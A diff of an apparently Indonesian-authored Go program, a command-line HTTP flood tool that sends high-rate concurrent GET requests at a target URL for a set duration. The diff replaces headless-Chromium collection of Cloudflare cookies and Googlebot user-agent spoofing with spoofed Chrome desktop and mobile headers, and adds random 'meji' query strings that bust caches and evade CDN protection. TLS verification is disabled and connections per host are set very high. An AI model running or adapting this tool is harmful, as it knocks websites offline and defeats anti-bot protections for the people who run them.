@@ -1,7 +1,6 @@
 package main
 
 import (
-	"context"
 	"crypto/tls"
 	"fmt"
 	"math/rand"
@@ -12,9 +11,16 @@ import (
 	"sync/atomic"
 	"time"
 
-	"github.com/chromedp/cdproto/network"
-	"github.com/chromedp/chromedp"
 	"github.com/valyala/fasthttp"
+)
+
+const (
+	uaDesktop = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
+	uaMobile  = "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
+
+	secChUaVal      = `"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"`
+	platformDesktop = `"Windows"`
+	platformMobile  = `"Android"`
 )
 
 type statsType struct {
@@ -25,132 +31,132 @@ type statsType struct {
 
 var stats statsType
 
-const (
-	maxConnsPerHost     = 18000
-	maxIdleConnDuration = 30 * time.Second
-	readTimeout         = 10 * time.Second
-	writeTimeout        = 10 * time.Second
-)
+// mejiChars adalah charset untuk value random query param
+const mejiChars = "abcdefghijklmnopqrstuvwxyz0123456789"
 
-var userAgents = []string{
-	// Google Bot
-	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+// mejiSuffixes adalah suffix yang bisa ditempel setelah "meji" sebagai key
+var mejiSuffixes = []string{
+	"", "App", "Load", "Ts", "Req", "Id", "Cache", "Rand", "Hit", "Src",
+	"Tk", "Ver", "Sid", "Uid", "Tag", "Ctx", "Ref", "Env", "Run", "Seq",
 }
 
-var acceptLanguages = []string{
-	"hi-IN,hi;q=0.9,en-IN;q=0.8,en;q=0.7",
-	"hi-IN,hi;q=0.9,en;q=0.8",
-	"en-IN,en;q=0.9,hi;q=0.8",
-	"en-IN,en;q=0.9",
-}
-
-var secFetchSites = []string{"none", "same-origin", "same-site", "cross-site"}
-var cacheControls = []string{"max-age=0", "no-cache", "no-store"}
-var connections = []string{"keep-alive", "close"}
-
-func getCFCookie(target string) string {
-	fmt.Println("[CF] Launching chromium to get cookies...")
-
-	opts := append(chromedp.DefaultExecAllocatorOptions[:],
-		chromedp.ExecPath("/repl/tools/bin/chromium"),
-		chromedp.Flag("headless", true),
-		chromedp.Flag("no-sandbox", true),
-		chromedp.Flag("disable-setuid-sandbox", true),
-		chromedp.Flag("disable-blink-features", "AutomationControlled"),
-		chromedp.UserAgent(userAgents[rand.Intn(len(userAgents))]),
-	)
-
-	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
-	defer cancel()
-
-	ctx, cancel := chromedp.NewContext(allocCtx)
-	defer cancel()
-
-	ctx, cancel = context.WithTimeout(ctx, 30*time.Second)
-	defer cancel()
-
-	var cookieStr string
-
-	err := chromedp.Run(ctx,
-		network.Enable(),
-		chromedp.Navigate(target),
-		chromedp.Sleep(5*time.Second),
-		chromedp.ActionFunc(func(ctx context.Context) error {
-			cookies, err := network.GetCookies().Do(ctx)
-			if err != nil {
-				return err
-			}
-			parts := []string{}
-			for _, c := range cookies {
-				parts = append(parts, c.Name+"="+c.Value)
-			}
-			cookieStr = strings.Join(parts, "; ")
-			return nil
-		}),
-	)
-
-	if err != nil {
-		fmt.Println("[CF] Failed:", err)
-		return ""
+// randStr generate random string dengan panjang n dari mejiChars
+func randStr(n int) string {
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = mejiChars[rand.Intn(len(mejiChars))]
 	}
+	return string(b)
+}
 
-	fmt.Println("[CF] Got cookie:", cookieStr)
-	return cookieStr
+// randomMejiQuery build query string random berawalan "meji"
+// contoh output: "meji=a3x9", "mejiLoad=yz12&mejiTs=891k"
+func randomMejiQuery() string {
+	// jumlah params: 1 s/d 3
+	nParams := rand.Intn(3) + 1
+	pairs := make([]string, 0, nParams)
+	used := make(map[string]bool)
+
+	for i := 0; i < nParams; i++ {
+		var key string
+		// cegah duplikat key
+		for {
+			suffix := mejiSuffixes[rand.Intn(len(mejiSuffixes))]
+			key = "meji" + suffix
+			if !used[key] {
+				used[key] = true
+				break
+			}
+		}
+		val := randStr(rand.Intn(8) + 4) // panjang value 4-11 char
+		pairs = append(pairs, key+"="+val)
+	}
+	return strings.Join(pairs, "&")
+}
+
+// appendMejiQuery tambah random meji query ke URL,
+// handle kalau URL udah ada '?' atau belum.
+// Kalau URL tanpa path (misal https://example.com),
+// otomatis ditambah '/' supaya jadi https://example.com/?meji=...
+func appendMejiQuery(rawURL string) string {
+	q := randomMejiQuery()
+	if strings.Contains(rawURL, "?") {
+		return rawURL + "&" + q
+	}
+	// Cek apakah ada path setelah scheme://host
+	// https://example.com → tidak ada path → tambah /
+	schemeEnd := strings.Index(rawURL, "://")
+	if schemeEnd >= 0 {
+		afterScheme := rawURL[schemeEnd+3:]
+		if !strings.Contains(afterScheme, "/") {
+			return rawURL + "/?" + q
+		}
+	}
+	return rawURL + "?" + q
 }
 
 func buildClient() *fasthttp.Client {
-	tlsConfig := &tls.Config{
-		InsecureSkipVerify: true,
-		MinVersion:         tls.VersionTLS13,
-		MaxVersion:         tls.VersionTLS13,
-		CurvePreferences: []tls.CurveID{
-			tls.X25519,
-			tls.CurveP256,
-		},
-	}
-
 	return &fasthttp.Client{
-		TLSConfig:           tlsConfig,
-		MaxConnsPerHost:     maxConnsPerHost,
-		MaxIdleConnDuration: maxIdleConnDuration,
-		ReadTimeout:         readTimeout,
-		WriteTimeout:        writeTimeout,
+		TLSConfig: &tls.Config{
+			InsecureSkipVerify:       true,
+			CurvePreferences:         []tls.CurveID{tls.X25519, tls.CurveP256},
+			PreferServerCipherSuites: true,
+			MinVersion:               tls.VersionTLS12,
+			MaxVersion:               tls.VersionTLS13,
+			CipherSuites: []uint16{
+				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
+				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
+			},
+		},
+		MaxConnsPerHost:     10000,
+		MaxIdleConnDuration: 30 * time.Second,
+		ReadTimeout:         10 * time.Second,
+		WriteTimeout:        10 * time.Second,
 	}
 }
 
-func setHeaders(req *fasthttp.Request, cookie string) {
-	ua := userAgents[rand.Intn(len(userAgents))]
-	lang := acceptLanguages[rand.Intn(len(acceptLanguages))]
+func setHeaders(req *fasthttp.Request, isMobile bool) {
+	var ua, platform, mobile string
 
-	req.Header.SetMethod("GET")
+	if isMobile {
+		ua = uaMobile
+		platform = platformMobile
+		mobile = "?1"
+	} else {
+		ua = uaDesktop
+		platform = platformDesktop
+		mobile = "?0"
+	}
+
 	req.Header.Set("User-Agent", ua)
-	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
-	req.Header.Set("Accept-Language", lang)
-	req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
-	req.Header.Set("Connection", connections[rand.Intn(len(connections))])
-	req.Header.Set("Upgrade-Insecure-Requests", "1")
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.9,id;q=0.8")
+	req.Header.Set("Cache-Control", "max-age=0")
+	req.Header.Set("Sec-Ch-Ua", secChUaVal)
+	req.Header.Set("Sec-Ch-Ua-Mobile", mobile)
+	req.Header.Set("Sec-Ch-Ua-Platform", platform)
 	req.Header.Set("Sec-Fetch-Dest", "document")
 	req.Header.Set("Sec-Fetch-Mode", "navigate")
-	req.Header.Set("Sec-Fetch-Site", secFetchSites[rand.Intn(len(secFetchSites))])
+	req.Header.Set("Sec-Fetch-Site", "none")
 	req.Header.Set("Sec-Fetch-User", "?1")
-	req.Header.Set("Cache-Control", cacheControls[rand.Intn(len(cacheControls))])
-	req.Header.Set("Priority", "u=1, i")
-	req.Header.Set("DNT", "1")
-	req.Header.Set("Pragma", "no-cache")
-
-	if cookie != "" {
-		req.Header.Set("Cookie", cookie)
-	}
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
+	req.Header.Set("Dnt", "1")
 }
 
-func makeRequest(client *fasthttp.Client, target string, cookie string) bool {
+func makeRequest(client *fasthttp.Client, target string, isMobile bool) bool {
 	req := fasthttp.AcquireRequest()
 	resp := fasthttp.AcquireResponse()
 	defer fasthttp.ReleaseRequest(req)
 	defer fasthttp.ReleaseResponse(resp)
 
-	req.SetRequestURI(target)
-	setHeaders(req, cookie)
+	req.SetRequestURI(appendMejiQuery(target))
+	req.Header.SetMethod(fasthttp.MethodGet)
+	setHeaders(req, isMobile)
 
 	err := client.DoTimeout(req, resp, 10*time.Second)
 	if err != nil {
@@ -162,31 +168,21 @@ func makeRequest(client *fasthttp.Client, target string, cookie string) bool {
 
 func main() {
 	if len(os.Args) < 4 {
-		fmt.Println("Missing arguments! Usage: tls <url> <duration_seconds> <rate_per_second> [cookie]")
-		fmt.Println("Example: tls https://meji.cc.cd 10 100")
+		fmt.Println("Usage: L <url> <duration_seconds> <rate_per_second>")
+		fmt.Println("Example: L https://example.com 10 100")
 		os.Exit(1)
 	}
 
 	target := os.Args[1]
-
 	duration, err := strconv.Atoi(os.Args[2])
 	if err != nil || duration <= 0 {
-		fmt.Println("Duration's gotta be a positive number (in seconds)")
+		fmt.Println("Error: duration must be a positive integer (seconds)")
 		os.Exit(1)
 	}
-
 	rate, err := strconv.Atoi(os.Args[3])
 	if err != nil || rate <= 0 {
-		fmt.Println("Rate's gotta be a positive number (req/s)")
+		fmt.Println("Error: rate must be a positive integer (req/s)")
 		os.Exit(1)
-	}
-
-	// cookie dari arg atau auto ambil dari chromium
-	cookie := ""
-	if len(os.Args) >= 5 && os.Args[4] != "" {
-		cookie = os.Args[4]
-	} else {
-		cookie = getCFCookie(target)
 	}
 
 	client := buildClient()
@@ -196,8 +192,8 @@ func main() {
 	deadline := time.After(time.Duration(duration) * time.Second)
 	var wg sync.WaitGroup
 
-	fmt.Printf("Sent requests to %s\n", target)
-	fmt.Printf("Time: %ds | Rate: %d req/s\n\n", duration, rate)
+	fmt.Printf("Starting fasthttp requests to %s\n", target)
+	fmt.Printf("Duration: %ds | Rate: %d req/s\n\n", duration, rate)
 
 	start := time.Now()
 
@@ -211,7 +207,10 @@ loop:
 			atomic.AddInt64(&stats.total, 1)
 			go func() {
 				defer wg.Done()
-				if makeRequest(client, target, cookie) {
+
+				isMobile := rand.Intn(100) < 40
+
+				if makeRequest(client, target, isMobile) {
 					atomic.AddInt64(&stats.success, 1)
 				} else {
 					atomic.AddInt64(&stats.failed, 1)
@@ -224,11 +223,12 @@ loop:
 	wg.Wait()
 	elapsed := time.Since(start).Seconds()
 
-	fmt.Println("Here's how it went")
-	fmt.Printf("Hit target: %s\n", target)
-	fmt.Printf("Time taken: %.2fs\n", elapsed)
-	fmt.Printf("Requests fired: %d\n", stats.total)
-	fmt.Printf("Landed clean: %d\n", stats.success)
-	fmt.Printf("Bounced back: %d\n", stats.failed)
-	fmt.Printf("Cruising at: %.2f req/s\n", float64(stats.total)/elapsed)
+	fmt.Println("========== SUMMARY ==========")
+	fmt.Printf("Target      : %s\n", target)
+	fmt.Printf("Duration    : %.2fs\n", elapsed)
+	fmt.Printf("Total Req   : %d\n", stats.total)
+	fmt.Printf("Success     : %d\n", stats.success)
+	fmt.Printf("Failed      : %d\n", stats.failed)
+	fmt.Printf("Avg Rate    : %.2f req/s\n", float64(stats.total)/elapsed)
+	fmt.Println("=============================")
 }
